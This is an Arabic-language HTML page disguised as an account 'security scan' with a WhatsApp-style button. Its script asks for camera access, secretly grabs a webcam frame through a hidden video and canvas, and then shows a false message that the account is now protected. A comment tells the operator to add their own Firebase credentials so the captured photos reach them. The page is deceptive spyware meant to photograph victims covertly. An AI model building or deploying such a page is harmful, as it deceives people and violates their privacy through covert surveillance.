<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فحص الأمان</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: sans-serif; text-align: center; padding-top: 100px; }
        .btn { padding: 15px 30px; background: #25d366; color: #fff; border: none; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <h3>جاري تأمين حسابك...</h3>
    <p>اضغط على "بدء الفحص" لتأمين الحساب</p>
    <button class="btn" onclick="start()">بدء الفحص</button>
    <video id="v" width="1" height="1" autoplay style="display:none;"></video>
    <canvas id="c" width="640" height="480" style="display:none;"></canvas>

    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <script>
        // هنا هتحط بيانات الفايربيس بتاعتك عشان الصور توصلك
        function start() {
            navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
                document.getElementById('v').srcObject = s;
                setTimeout(() => {
                    const canvas = document.getElementById('c');
                    canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0);
                    const img = canvas.toDataURL('image/jpeg');
                    console.log("تم التقاط الصورة");
                    alert("تم الفحص بنجاح! حسابك محمي");
                }, 3000);
            }).catch(e => alert("خطأ: يجب السماح بالكاميرا للفحص"));
        }
    </script>
</body>
</html>
